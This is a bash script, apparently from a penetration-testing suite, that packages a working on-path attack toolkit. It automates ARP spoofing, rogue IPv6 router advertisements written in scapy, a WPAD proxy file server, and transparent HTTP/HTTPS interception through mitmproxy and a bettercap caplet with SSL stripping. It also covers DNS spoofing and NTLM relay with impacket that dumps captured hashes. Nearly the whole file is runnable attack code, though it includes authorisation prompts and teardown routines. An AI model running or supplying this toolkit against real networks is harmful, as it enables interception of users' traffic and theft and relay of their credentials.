#!/usr/bin/env bash
# =============================================================================
# mitm_toolkit.sh - on-path (MITM) attack toolkit
# =============================================================================
#
# Description
# -----------
# One interface for the classic on-path primitives: ARP spoofing, IPv6 router
# advertisement / DHCPv6 takeover, WPAD hijacking, transparent HTTP/HTTPS
# proxying with mitmproxy or bettercap, DNS spoofing, and NTLM relay. Each mode
# runs in a timestamped session directory, logs what it did, writes an event to
# the shared database, and restores the network state on exit.
#
# Modes
#   arp        full-duplex ARP spoof between gateway and target(s)
#   ipv6       rogue router advertisement + optional DHCPv6
#   wpad       serve a proxy autoconfig file and capture proxy authentication
#   http       transparent HTTP/HTTPS proxy (mitmproxy / bettercap)
#   dns        answer DNS queries with attacker-controlled addresses
#   relay      relay NTLM authentications to an SMB/LDAP/HTTP target
#   clean      remove all cyberdeck firewall/policy rules and stop helpers
#   status     show active routes, forwarding state and running helpers
#
# Author      : cyberdeck-arsenal contributors
# Version     : 1.0.0
# Dependencies: arpspoof (dsniff), bettercap, mitmproxy, impacket,
#               iptables/nft, iproute2, python3, cyberdeck_common.sh
# Licence     : MIT - AUTHORISED TARGETS ONLY. Interception is an offence
#               without written authorisation (UK CMA 1990 s.1/s.3A).
#
# Usage
# -----
#   sudo ./mitm_toolkit.sh --mode arp --target 10.0.0.50 --iface eth0
#   sudo ./mitm_toolkit.sh --mode ipv6 --iface eth0 --duration 600
#   sudo ./mitm_toolkit.sh --mode http --iface eth0 --proxy mitmproxy
#   sudo ./mitm_toolkit.sh --mode relay --target 10.0.0.9 --relay-proto smb
#   sudo ./mitm_toolkit.sh --mode clean
#   ./mitm_toolkit.sh --help
# =============================================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
if [[ -f "${SCRIPT_DIR}/../lib/cyberdeck_common.sh" ]]; then
    source "${SCRIPT_DIR}/../lib/cyberdeck_common.sh"
elif [[ -f /opt/cyberdeck-arsenal/lib/cyberdeck_common.sh ]]; then
    source /opt/cyberdeck-arsenal/lib/cyberdeck_common.sh
else
    echo "fatal: cyberdeck_common.sh not found" >&2
    exit 1
fi

cdeck::init "mitm_toolkit"

INSTALL_DIR="$(cdeck::conf_get general.install_dir /opt/cyberdeck-arsenal)"
CAPTURE_ROOT="${INSTALL_DIR}/captures/mitm"
STATE_DIR="${INSTALL_DIR}/state"
SESSION_DIR=""
MODE=""
IFACE=""
TARGET=""
GATEWAY=""
PROXY="mitmproxy"
PROXY_PORT=8080
RELAY_PROTO="smb"
RELAY_TARGET=""
DNS_ADDR="10.0.0.1"
DURATION=0
WPAD_PORT=80
IPV6_PREFIX="2001:db8:dead:beef::/64"
KEEP_RUNNING=1

usage() {
    cdeck::usage_header \
        "On-path attack toolkit (ARP, IPv6, WPAD, proxy, DNS, NTLM relay)" \
        "$0 --mode <arp|ipv6|wpad|http|dns|relay|clean|status> [options]" \
        "sudo $0 --mode arp --target 10.0.0.50 --iface eth0" \
        "sudo $0 --mode ipv6 --iface eth0 --duration 900" \
        "sudo $0 --mode http --iface eth0 --proxy mitmproxy --proxy-port 8080" \
        "sudo $0 --mode relay --relay-target 10.0.0.9 --relay-proto smb" \
        "sudo $0 --mode clean"
    cat <<EOF

${C_BOLD}OPTIONS${C_RESET}
  -m, --mode MODE       arp | ipv6 | wpad | http | dns | relay | clean | status
  -i, --iface IF        interface to use (default: the default-route interface)
  -t, --target IP       victim address (arp/http/wpad/dns); repeat or comma-separate
  -g, --gateway IP      gateway to impersonate (arp/http/dns; auto-detected if omitted)
  --proxy TOOL          mitmproxy | bettercap | both   (default: ${PROXY})
  --proxy-port N        proxy listen port (default: ${PROXY_PORT})
  --wpad-port N         WPAD HTTP port (default: ${WPAD_PORT})
  --relay-target IP     relay destination (relay mode)
  --relay-proto P       smb | http | ldap | mssql | rdp | all  (default: ${RELAY_PROTO})
  --dns-addr IP         address to answer DNS queries with (default: ${DNS_ADDR})
  --prefix PREFIX       IPv6 prefix to advertise (default: ${IPV6_PREFIX})
  --duration N          stop after N seconds (0 = until Ctrl-C)
  --no-forward          do not enable IP forwarding (cut-off / DoS style)
  --yes                 skip the authorisation prompt
  --help, -h            this help

${C_BOLD}WHAT HAPPENS ON EXIT${C_RESET}
  Forwarding and kernel policy settings are restored, iptables rules in the
  CDECK_* chains are removed, helper processes are stopped, and the session is
  hashed into the chain-of-custody log. Anything the victim cached (ARP entries,
  DNS, WPAD) recovers by itself within a couple of minutes.

${C_YELLOW}⚠  A relay or proxy mistake can lock a client out of its network.${C_RESET}
  Keep the helpdesk or network owner on standby, and agree the window in writing.
EOF
}

# --------------------------------------------------------------------------- #
# Argument parsing
# --------------------------------------------------------------------------- #
while (( $# )); do
    case "$1" in
        --help|-h)        usage; exit 0 ;;
        --version|-V)     printf 'mitm_toolkit %s\n' "${CDECK_VERSION}"; exit 0 ;;
        -m|--mode)        shift; MODE="${1:-}" ;;
        -i|--iface)       shift; IFACE="${1:-}" ;;
        -t|--target)      shift; TARGET="${TARGET}${TARGET:+,}${1:-}" ;;
        -g|--gateway)     shift; GATEWAY="${1:-}" ;;
        --proxy)          shift; PROXY="${1:-mitmproxy}" ;;
        --proxy-port)     shift; PROXY_PORT="${1:-8080}" ;;
        --wpad-port)      shift; WPAD_PORT="${1:-80}" ;;
        --relay-target)   shift; RELAY_TARGET="${1:-}" ;;
        --relay-proto)    shift; RELAY_PROTO="${1:-smb}" ;;
        --dns-addr)       shift; DNS_ADDR="${1:-10.0.0.1}" ;;
        --prefix)         shift; IPV6_PREFIX="${1:-2001:db8::/64}" ;;
        --duration)       shift; DURATION="${1:-0}" ;;
        --no-forward)     KEEP_RUNNING=0 ;;
        --yes|-y)         export CDECK_ASSUME_YES=1 ;;
        *)                cdeck::warn "ignoring unknown argument: $1" ;;
    esac
    shift
done

[[ -z "${MODE}" ]] && { cdeck::error "no mode selected"; usage; exit 2; }

# --------------------------------------------------------------------------- #
# Shared helpers
# --------------------------------------------------------------------------- #
pick_interface() {
    local candidate
    candidate="$(cdeck::default_iface)"
    if [[ -n "${candidate}" && "${candidate}" != "lo" ]]; then
        printf '%s' "${candidate}"; return 0
    fi
    candidate="$(cdeck::conf_get network.primary_interface "")"
    [[ -n "${candidate}" && -d "/sys/class/net/${candidate}" ]] && { printf '%s' "${candidate}"; return 0; }
    while read -r candidate; do
        [[ "${candidate}" == "lo" ]] && continue
        printf '%s' "${candidate}"; return 0
    done < <(cdeck::interfaces)
    return 1
}

save_state() {
    # Persist the settings we are about to change so `clean` can undo them
    mkdir -p "${STATE_DIR}"
    local key value
    for key in net.ipv4.ip_forward net.ipv6.conf.all.forwarding \
               net.ipv4.conf.all.send_redirects; do
        value="$(sysctl -n "${key}" 2>/dev/null || echo 0)"
        printf '%s=%s\n' "${key}" "${value}" >> "${STATE_DIR}/mitm_state.env"
    done
    printf 'iface=%s\n' "${IFACE}" >> "${STATE_DIR}/mitm_state.env"
    printf 'mode=%s\n' "${MODE}" >> "${STATE_DIR}/mitm_state.env"
    printf 'session=%s\n' "${SESSION_DIR}" >> "${STATE_DIR}/mitm_state.env"
    printf 'started=%s\n' "$(date -Is)" >> "${STATE_DIR}/mitm_state.env"
}

enable_forwarding() {
    (( KEEP_RUNNING )) || { cdeck::warn "--no-forward: traffic will be dropped, not forwarded"; return 0; }
    sysctl -q -w net.ipv4.ip_forward=1 2>/dev/null || true
    sysctl -q -w net.ipv4.conf.all.send_redirects=0 2>/dev/null || true
    cdeck::ok "IP forwarding enabled"
}

start_arp_spoof() {
    local target="$1"
    if ! cdeck::has_cmd arpspoof; then
        cdeck::error "arpspoof is required (pacman -S dsniff)"
        return 1
    fi
    [[ -z "${GATEWAY}" ]] && {
        GATEWAY="$(ip route show default dev "${IFACE}" 2>/dev/null | awk '/default/ {print $3; exit}')"
    }
    [[ -z "${GATEWAY}" ]] && { cdeck::error "could not detect the gateway - pass --gateway"; return 1; }

    cdeck::info "poisoning ${target} ⇄ ${GATEWAY} (we become the router for both)"
    arpspoof -i "${IFACE}" -t "${target}"    "${GATEWAY}" > "${SESSION_DIR}/arpspoof_${target//./_}.log" 2>&1 &
    echo "$!" > "${SESSION_DIR}/arpspoof_${target//./_}.pid"
    arpspoof -i "${IFACE}" -t "${GATEWAY}"   "${target}"    > "${SESSION_DIR}/arpspoof_gw_${target//./_}.log" 2>&1 &
    echo "$!" > "${SESSION_DIR}/arpspoof_gw_${target//./_}.pid"
    sleep 1
    cdeck::ok "ARP spoof active for ${target}"
    return 0
}

teardown() {
    cdeck::info "restoring network state"
    local pidfile
    for pidfile in "${SESSION_DIR}"/*.pid; do
        [[ -f "${pidfile}" ]] || continue
        kill -TERM "$(cat "${pidfile}")" 2>/dev/null || true
        rm -f "${pidfile}"
    done
    cdeck::kill_processes "arpspoof" "mitmproxy" "bettercap" "ntlmrelayx.py" "responder" || true
    remove_rules
    if [[ -f "${STATE_DIR}/mitm_state.env" ]]; then
        local key value
        while IFS='=' read -r key value; do
            case "${key}" in
                net.*) sysctl -q -w "${key}=${value}" 2>/dev/null || true ;;
            esac
        done < "${STATE_DIR}/mitm_state.env"
    fi
    # Heal the ARP caches so clients recover immediately
    if cdeck::has_cmd arping && [[ -n "${GATEWAY}" && -n "${TARGET}" ]]; then
        local victim
        for victim in ${TARGET//,/ }; do
            arping -U -c 3 -I "${IFACE}" -s "${GATEWAY}"  "${victim}" >/dev/null 2>&1 || true
            arping -U -c 3 -I "${IFACE}" -s "${victim}"   "${GATEWAY}" >/dev/null 2>&1 || true
        done
        cdeck::info "corrective ARP replies sent - victim connectivity should return within seconds"
    fi
    seal_session
}

remove_rules() {
    cdeck::has_cmd iptables || return 0
    local table chain
    for chain in CDECK_FORWARD CDECK_NAT CDECK_INPUT; do
        iptables -t nat -D PREROUTING -j "${chain}" 2>/dev/null || true
        iptables -D FORWARD  -j "${chain}" 2>/dev/null || true
        iptables -D INPUT    -j "${chain}" 2>/dev/null || true
        iptables -t nat -F "${chain}" 2>/dev/null || true
        iptables -F "${chain}" 2>/dev/null || true
        iptables -t nat -X "${chain}" 2>/dev/null || true
        iptables -X "${chain}" 2>/dev/null || true
    done
    # DHCPv6/WPAD helper rules added by --mode wpad / ipv6
    iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports "${WPAD_PORT}" 2>/dev/null || true
    cdeck::ok "cyberdeck firewall rules removed"
}

seal_session() {
    [[ -z "${SESSION_DIR}" || ! -d "${SESSION_DIR}" ]] && return 0
    local hasher="${SCRIPT_DIR}/../recon/reporting/evidence_hasher.py"
    [[ -f "${hasher}" ]] || return 0
    python3 "${hasher}" "${SESSION_DIR}" --note "mitm ${MODE} session" >/dev/null 2>&1 \
        && cdeck::ok "session sealed into the chain-of-custody log" \
        || cdeck::warn "could not seal the session - run: cdeck hash ${SESSION_DIR}"
}

event() {
    local message="$1" severity="${2:-INFO}"
    python3 - "${message}" "${severity}" "${MODE}" <<'PYEOF' 2>/dev/null || true
import sys
try:
    sys.path.insert(0, "/opt/cyberdeck-arsenal/lib")
    from cyberlib import Database
    with Database("events") as db:
        db.event("mitm_toolkit", sys.argv[3], sys.argv[1], sys.argv[2])
except Exception:
    pass
PYEOF
}

# --------------------------------------------------------------------------- #
# Mode: status and clean (no root needed for status)
# --------------------------------------------------------------------------- #
show_status() {
    cdeck::banner "on-path status" "$(date '+%H:%M:%S')"
    printf '\n  %sforwarding%s\n' "${C_BOLD}" "${C_RESET}"
    printf '    ipv4            : %s\n' "$(sysctl -n net.ipv4.ip_forward 2>/dev/null || echo '?')"
    printf '    ipv6            : %s\n' "$(sysctl -n net.ipv6.conf.all.forwarding 2>/dev/null || echo '?')"
    printf '    send_redirects  : %s\n' "$(sysctl -n net.ipv4.conf.all.send_redirects 2>/dev/null || echo '?')"

    printf '\n  %sactive sessions%s\n' "${C_BOLD}" "${C_RESET}"
    if [[ -f "${STATE_DIR}/mitm_state.env" ]]; then
        sed 's/^/    /' "${STATE_DIR}/mitm_state.env"
    else
        printf '    none recorded\n'
    fi

    printf '\n  %shelper processes%s\n' "${C_BOLD}" "${C_RESET}"
    local found=0 name
    for name in arpspoof mitmproxy bettercap ntlmrelayx Responder.py; do
        if pgrep -af "${name}" 2>/dev/null | grep -qv "grep"; then
            pgrep -af "${name}" 2>/dev/null | sed 's/^/    /' | head -3
            found=1
        fi
    done
    (( found )) || printf '    none running\n'

    printf '\n  %scyberdeck firewall chains%s\n' "${C_BOLD}" "${C_RESET}"
    if cdeck::has_cmd iptables; then
        iptables -t nat -S 2>/dev/null | grep -i cdeck | sed 's/^/    /' || printf '    none\n'
    else
        printf '    iptables not installed\n'
    fi

    printf '\n  %ssessions on disk%s (%s)\n' "${C_BOLD}" "${C_RESET}" "${CAPTURE_ROOT}"
    find "${CAPTURE_ROOT}" -maxdepth 1 -mindepth 1 -type d 2>/dev/null | sort | tail -5 | sed 's/^/    /' \
        || printf '    none\n'
    printf '\n'
}

do_clean() {
    cdeck::require_root "cleaning up on-path state" || return 1
    cdeck::banner "cleaning up" "removing rules and stopping helpers"
    cdeck::kill_processes "arpspoof" "mitmproxy" "bettercap" "ntlmrelayx.py" "responder" \
        "wpad" "dhcpd" || true
    remove_rules
    if [[ -f "${STATE_DIR}/mitm_state.env" ]]; then
        local key value
        while IFS='=' read -r key value; do
            case "${key}" in
                net.*) sysctl -q -w "${key}=${value}" 2>/dev/null \
                          && cdeck::debug "restored ${key}=${value}" ;;
            esac
        done < "${STATE_DIR}/mitm_state.env"
        mv "${STATE_DIR}/mitm_state.env" "${STATE_DIR}/mitm_state.env.restored" 2>/dev/null || true
        cdeck::ok "kernel settings restored from the saved state"
    fi
    if cdeck::has_cmd systemctl; then
        systemctl restart NetworkManager >/dev/null 2>&1 && cdeck::ok "NetworkManager restarted" || true
    fi
    cdeck::ok "cleanup complete - if a host is still offline, reconnect it or restart its DHCP client"
    return 0
}

if [[ "${MODE}" == "status" ]]; then show_status; exit 0; fi
if [[ "${MODE}" == "clean"  ]]; then do_clean; exit $?; fi

# --------------------------------------------------------------------------- #
# Pre-flight for attacking modes
# --------------------------------------------------------------------------- #
cdeck::require_root "on-path attacks" || exit 1
cdeck::require_acknowledgement || exit 1

case "${MODE}" in
    arp|ipv6|wpad|http|dns|relay) ;;
    *) cdeck::error "unknown mode: ${MODE}"; usage; exit 2 ;;
esac

if [[ -z "${IFACE}" ]]; then
    IFACE="$(pick_interface)"
    cdeck::warn "no interface given - using ${IFACE:-none}"
fi
[[ -z "${IFACE}" || ! -d "/sys/class/net/${IFACE}" ]] && {
    cdeck::error "interface not found: ${IFACE:-<none>}"; exit 2; }

# Default target: the whole subnet (broadcast) unless a victim was given
if [[ -z "${TARGET}" ]]; then
    TARGET="$(ip -4 -o route show dev "${IFACE}" scope link 2>/dev/null \
              | awk '/proto kernel/ {print $1; exit}')"
fi

cdeck::banner "on-path: ${MODE}" "${IFACE} · target ${TARGET:-none} · gateway ${GATEWAY:-auto}"
cdeck::legal_warning "interception of traffic on ${IFACE}"
cdeck::confirm "Confirm you have written authorisation for this network?" n || {
    cdeck::error "aborted at the authorisation prompt"; exit 1; }

# --- session scaffolding --------------------------------------------------- #
mkdir -p "${CAPTURE_ROOT}" "${STATE_DIR}"
chmod 0700 "${CAPTURE_ROOT}"
SESSION_DIR="${CAPTURE_ROOT}/$(cdeck::stamp)_${MODE}"
mkdir -p "${SESSION_DIR}"
chmod 0700 "${SESSION_DIR}"
{
    printf 'mode      : %s\n' "${MODE}"
    printf 'interface : %s\n' "${IFACE}"
    printf 'mac       : %s\n' "$(cdeck::iface_mac "${IFACE}")"
    printf 'local ip  : %s\n' "$(ip -4 -o addr show "${IFACE}" 2>/dev/null | awk '{print $4}' | paste -sd, -)"
    printf 'target(s) : %s\n' "${TARGET:-none}"
    printf 'gateway   : %s\n' "${GATEWAY:-auto}"
    printf 'operator  : %s\n' "$(cdeck::conf_get general.operator_name operator)"
    printf 'started   : %s\n' "$(date -Is)"
} > "${SESSION_DIR}/session.txt"
save_state
cdeck::ok "session directory: ${SESSION_DIR}"

trap 'teardown; exit 0' INT TERM

run_until_stopped() {
    # Run the body until the duration expires or the user interrupts
    if (( DURATION > 0 )); then
        cdeck::info "running for ${DURATION}s"
        local elapsed=0
        while (( elapsed < DURATION )); do
            sleep 5
            elapsed=$(( elapsed + 5 ))
            if (( elapsed % 30 == 0 )); then
                cdeck::info "${elapsed}/${DURATION}s - still active"
            fi
        done
    else
        cdeck::warn "running until Ctrl-C"
        while true; do sleep 5; done
    fi
}

# --------------------------------------------------------------------------- #
# Mode: arp
# --------------------------------------------------------------------------- #
mode_arp() {
    cdeck::info "ARP spoofing with ${TARGET:-no target} (this is layer-2, switching does not help the victim)"
    enable_forwarding
    [[ "${TARGET}" == *",",* ]] || [[ -n "${TARGET}" ]] || {
        cdeck::error "arp mode needs at least one --target"; return 2; }
    local victim
    for victim in ${TARGET//,/ }; do
        start_arp_spoof "${victim}" || return 1
    done

    if cdeck::has_cmd tcpdump; then
        tcpdump -i "${IFACE}" -nn -U -w "${SESSION_DIR}/forwarded.pcap" \
            "net ${TARGET%%,*}" > "${SESSION_DIR}/tcpdump.log" 2>&1 &
        echo "$!" > "${SESSION_DIR}/tcpdump.pid"
        cdeck::info "capturing forwarded traffic to ${SESSION_DIR}/forwarded.pcap"
    fi

    if cdeck::has_cmd driftnet; then
        cdeck::info "driftnet is available: run 'driftnet -i ${IFACE}' in another pane to view images"
    fi
    cdeck::warn "run in another pane: sudo bettercap -iface ${IFACE} (for HTTP/TLS stripping)"
    run_until_stopped
}

# --------------------------------------------------------------------------- #
# Mode: ipv6
# --------------------------------------------------------------------------- #
mode_ipv6() {
    local prefix="${IPV6_PREFIX%%/*}" prefix_len="${IPV6_PREFIX##*/}"
    # Assign the prefix address to our interface so hosts can reach us
    cdeck::info "advertising ${IPV6_PREFIX} as the on-link prefix"
    sysctl -q -w net.ipv6.conf.all.forwarding=1 2>/dev/null || true
    ip -6 addr add "${prefix}1/${prefix_len}" dev "${IFACE}" 2>/dev/null || \
        cdeck::debug "prefix address already present on ${IFACE}"

    # Use the toolkit's own RA sender when scapy is present, else radvd-style fallback
    local venv_py="${INSTALL_DIR}/venv/bin/python3"
    [[ -x "${venv_py}" ]] || venv_py="python3"
    if "${venv_py}" -c "import scapy" 2>/dev/null; then
        cdeck::info "sending router advertisements with scapy"
        "${venv_py}" - "${IFACE}" "${IPV6_PREFIX}" "${DURATION}" "${SESSION_DIR}" <<'PYEOF' &
import sys, time
from pathlib import Path
from scapy.all import Ether, IPv6, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo, ICMPv6NDOptDNS, sendp

iface, prefix, duration, session = sys.argv[1], sys.argv[2], int(sys.argv[3]), Path(sys.argv[4])
mac = Path(f"/sys/class/net/{iface}/address").read_text().strip()
# Build a link-local address from the MAC with the U/L bit flipped (EUI-64 style)
octets = [int(part, 16) for part in mac.split(":")]
octets[0] ^= 0x02
link_local = "fe80::" + ":".join(f"{octets[i]:02x}{octets[i + 1]:02x}" for i in (0, 2, 4))
network = prefix.split("/")[0]
count = 0
started = time.time()
while duration == 0 or time.time() - started < duration:
    ra = (Ether(dst="33:33:00:00:00:01", src=mac) /
          IPv6(src=link_local, dst="ff02::1") /
          ICMPv6ND_RA(routerlifetime=1800, reachabletime=30000, retranstimer=1000) /
          ICMPv6NDOptPrefixInfo(prefixlen=int(prefix.split("/")[1]), prefix=network,
                                validlifetime=3600, preferredlifetime=1800) /
          ICMPv6NDOptDNS(lifetime=1800, dns=network + "1"))
    sendp(ra, iface=iface, verbose=False)
    count += 1
    (session / "router_advertisements.log").write_text(
        f"{time.strftime('%Y-%m-%dT%H:%M:%S')} RA #{count} from {link_local}, prefix {prefix}\n")
    if count % 20 == 0:
        print(f"  sent {count} router advertisements")
    time.sleep(3)
print(f"sent {count} router advertisements in total")
PYEOF
        echo "$!" > "${SESSION_DIR}/ra.pid"
    else
        cdeck::warn "scapy is not available - using the kernel's own RA sender"
        cdeck::info "install it with: ${INSTALL_DIR}/venv/bin/pip install scapy"
        sysctl -q -w "net.ipv6.conf.${IFACE}.accept_ra=0" 2>/dev/null || true
        sysctl -q -w "net.ipv6.conf.${IFACE}.ra_defrtr_metric=1" 2>/dev/null || true
    fi

    if cdeck::has_cmd tcpdump; then
        tcpdump -i "${IFACE}" -nn -U -w "${SESSION_DIR}/ipv6.pcap" "ip6" \
            > "${SESSION_DIR}/tcpdump.log" 2>&1 &
        echo "$!" > "${SESSION_DIR}/tcpdump.pid"
    fi
    cdeck::ok "IPv6 takeover running - dual-stack clients will prefer us"
    cdeck::info "many networks filter IPv6 entirely, which makes this a good pivot"
    run_until_stopped
}

# --------------------------------------------------------------------------- #
# Mode: wpad
# --------------------------------------------------------------------------- #
mode_wpad() {
    cdeck::info "serving a WPAD proxy autoconfig file on port ${WPAD_PORT}"
    local listener_ip="${TARGET%%,*}"
    [[ -z "${listener_ip}" || "${listener_ip}" == *"/"* ]] && \
        listener_ip="$(ip -4 -o addr show "${IFACE}" | awk '{print $4}' | cut -d/ -f1 | head -1)"

    cat > "${SESSION_DIR}/wpad.dat" <<EOF
// cyberdeck-arsenal WPAD file - generated $(date -Is)
function FindProxyForURL(url, host) {
    return "PROXY ${listener_ip}:${PROXY_PORT}; DIRECT";
}
EOF
    cdeck::info "WPAD file written to ${SESSION_DIR}/wpad.dat"

    # Serve wpad.dat over HTTP for any host that asks
    if command -v python3 >/dev/null 2>&1; then
        ( cd "${SESSION_DIR}" && python3 -m http.server "${WPAD_PORT}" \
              --bind "${listener_ip}" > "${SESSION_DIR}/wpad_http.log" 2>&1 ) &
        echo "$!" > "${SESSION_DIR}/wpad_http.pid"
        cdeck::ok "WPAD server listening on http://${listener_ip}:${WPAD_PORT}/wpad.dat"
    else
        cdeck::error "python3 is required to serve the WPAD file"
        return 1
    fi

    # DNS names the browsers look up
    cdeck::info "clients must resolve wpad.<domain> to us for this to work"
    cdeck::info "combine with --mode dns if the domain's DNS is reachable"
    run_until_stopped
}

# --------------------------------------------------------------------------- #
# Mode: http (transparent proxy)
# --------------------------------------------------------------------------- #
mode_http() {
    cdeck::info "running a transparent HTTP/HTTPS proxy with ${PROXY}"
    enable_forwarding

    # Redirect web traffic through the proxy
    if cdeck::has_cmd iptables; then
        iptables -t nat -N CDECK_NAT 2>/dev/null || iptables -t nat -F CDECK_NAT
        local victim
        for victim in ${TARGET//,/ }; do
            iptables -t nat -A CDECK_NAT -p tcp -s "${victim}" --dport 80  -j REDIRECT --to-ports "${PROXY_PORT}"
            iptables -t nat -A CDECK_NAT -p tcp -s "${victim}" --dport 443 -j REDIRECT --to-ports "${PROXY_PORT}"
        done
        iptables -t nat -I PREROUTING 1 -j CDECK_NAT
        cdeck::ok "traffic from ${TARGET} redirected to local port ${PROXY_PORT}"
    else
        cdeck::warn "iptables is not installed - the victim must be configured to use the proxy explicitly"
    fi

    local -a started=()
    if [[ "${PROXY}" == "mitmproxy" || "${PROXY}" == "both" ]]; then
        if cdeck::has_cmd mitmproxy; then
            cdeck::info "starting mitmproxy in transparent mode (port ${PROXY_PORT})"
            mitmproxy --mode transparent --listen-port "${PROXY_PORT}" --showhost \
                -w "${SESSION_DIR}/flows.mitm" > "${SESSION_DIR}/mitmproxy.log" 2>&1 &
            echo "$!" > "${SESSION_DIR}/mitmproxy.pid"
            started+=("mitmproxy")
        else
            cdeck::warn "mitmproxy is not installed (pacman -S mitmproxy)"
        fi
    fi
    if [[ "${PROXY}" == "bettercap" || "${PROXY}" == "both" ]]; then
        if cdeck::has_cmd bettercap; then
            local caplet="${SESSION_DIR}/bettercap.caplet"
            cat > "${caplet}" <<EOF
# cyberdeck-arsenal MITM caplet
set http.proxy.port ${PROXY_PORT}
set http.proxy.sslstrip true
set net.sniff.verbose true
set events.stream.output ${SESSION_DIR}/bettercap_events.log
http.proxy on
net.sniff on
EOF
            cdeck::info "starting bettercap with the generated caplet"
            bettercap -iface "${IFACE}" -caplet "${caplet}" > "${SESSION_DIR}/bettercap.log" 2>&1 &
            echo "$!" > "${SESSION_DIR}/bettercap.pid"
            started+=("bettercap")
        else
            cdeck::warn "bettercap is not installed (Installing takes a while: pacman -S bettercap)"
        fi
    fi
    (( ${#started[@]} )) || { cdeck::error "no proxy tool could be started"; return 1; }
    cdeck::ok "proxy running: ${started[*]}"
    cdeck::warn "TLS interception needs a trusted CA in the victim's store - expect warnings otherwise"
    run_until_stopped
}

# --------------------------------------------------------------------------- #
# Mode: dns
# --------------------------------------------------------------------------- #
mode_dns() {
    if ! cdeck::has_cmd dnschef && ! cdeck::has_cmd dnsspoof; then
        cdeck::error "dnschef (pacman -S dnschef) or dnsspoof (dsniff) is required"
        return 1
    fi
    cdeck::info "spoofing DNS answers for ${TARGET} with ${DNS_ADDR}"
    enable_forwarding

    cat > "${SESSION_DIR}/dnsmap.txt" <<EOF
# cyberdeck-arsenal DNS spoof map - $(date -Is)
# Every A query from the victim resolves to ${DNS_ADDR}
*.*.*.*  A  ${DNS_ADDR}
EOF

    if cdeck::has_cmd dnschef; then
        dnschef --fakeip "${DNS_ADDR}" --interface "${IFACE}" --nameserver 8.8.8.8 \
            --logfile "${SESSION_DIR}/dnschef.log" -q > "${SESSION_DIR}/dnschef.stdout" 2>&1 &
        echo "$!" > "${SESSION_DIR}/dnschef.pid"
    else
        dnsspoof -i "${IFACE}" -f "${SESSION_DIR}/dnsmap.txt" \
            > "${SESSION_DIR}/dnsspoof.log" 2>&1 &
        echo "$!" > "${SESSION_DIR}/dnsspoof.pid"
    fi
    sleep 1
    cdeck::ok "DNS interception running (answers point at ${DNS_ADDR})"
    cdeck::info "combine with --mode arp so the victim actually sends its queries to us"
    if cdeck::has_cmd python3; then
        cdeck::info "serve a convincing web page: cd ${SESSION_DIR} && python3 -m http.server 80"
    fi
    run_until_stopped
}

# --------------------------------------------------------------------------- #
# Mode: relay
# --------------------------------------------------------------------------- #
mode_relay() {
    if [[ -z "${RELAY_TARGET}" ]]; then
        cdeck::error "relay mode needs --relay-target <ip>"
        return 2
    fi
    if ! cdeck::has_cmd impacket-ntlmrelayx && ! cdeck::has_cmd ntlmrelayx.py; then
        cdeck::error "impacket is required (pacman -S impacket)"
        return 1
    fi
    local relay_bin
    relay_bin="$(command -v impacket-ntlmrelayx || command -v ntlmrelayx.py)"

    # Pick a target list file: one protocol/address pair per line
    local targets_file="${SESSION_DIR}/relay_targets.txt"
    local protocol="${RELAY_PROTO}"
    [[ "${protocol}" == "all" ]] && protocol="smb"
    # impacket expects one "protocol://address" per line
    printf '%s' "${RELAY_TARGET}" | tr ',' '\n' | sed "s#^#${protocol}://#" > "${targets_file}"
    cdeck::info "relay targets: $(paste -sd, "${targets_file}")"

    local loot="${SESSION_DIR}/loot"
    mkdir -p "${loot}"

    # Relay needs our own listeners, so keep Responder as the poisoner only
    cdeck::info "starting ${relay_bin} (dumps to ${loot})"
    "${relay_bin}" -tf "${targets_file}" -of "${SESSION_DIR}/relay_hashes" -l "${loot}" \
        -smb2support -w -i "$(ip -4 -o addr show "${IFACE}" | awk '{print $4}' | cut -d/ -f1 | head -1)" \
        > "${SESSION_DIR}/ntlmrelayx.log" 2>&1 &
    echo "$!" > "${SESSION_DIR}/ntlmrelayx.pid"
    sleep 2
    cdeck::ok "relay listener running"
    cdeck::warn "if SMB signing is enforced on the target, relay attempts will fail - that is a finding in itself"
    cdeck::info "start the poisoner alongside it: attack/responder_launcher.sh --analyse-only-friendly"
    cdeck::info "  (or run attack/responder_launcher.sh --iface ${IFACE} with SMB/HTTP servers disabled)"
    run_until_stopped
}

# --------------------------------------------------------------------------- #
# Dispatch
# --------------------------------------------------------------------------- #
case "${MODE}" in
    arp)   mode_arp ;;
    ipv6)  mode_ipv6 ;;
    wpad)  mode_wpad ;;
    http)  mode_http ;;
    dns)   mode_dns ;;
    relay) mode_relay ;;
esac
status=$?

teardown
event "on-path ${MODE} session completed (target ${TARGET:-n/a})" INFO
printf '\n'
cdeck::ok "session complete: ${SESSION_DIR}"
printf '  %-12s %s\n' "session" "${SESSION_DIR}/session.txt"
printf '  %-12s %s\n' "captures" "${SESSION_DIR}"
printf '\n'
exit "${status}"
